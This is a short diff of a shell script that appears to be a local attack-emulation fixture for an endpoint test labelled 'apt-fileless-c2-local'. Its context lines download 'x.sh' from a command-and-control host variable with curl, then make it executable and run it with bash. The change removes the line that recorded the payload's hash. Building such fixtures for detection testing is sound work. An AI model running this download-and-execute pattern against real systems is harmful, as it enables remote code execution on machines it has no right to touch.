@@ -62,6 +62,5 @@ curl --noproxy '*' -fsS "http://$C2:$HTTP_PORT/x.sh" -o "$PAYLOAD"
 chmod +x "$PAYLOAD"
 bash "$PAYLOAD"
 
-sha256sum "$PAYLOAD" > "$FIXTURE_DIR/payload.sha256"
 test -s "$BEACON"
 echo "[apt-fileless-c2-local] attack executed (vm endpoint local fixture)"
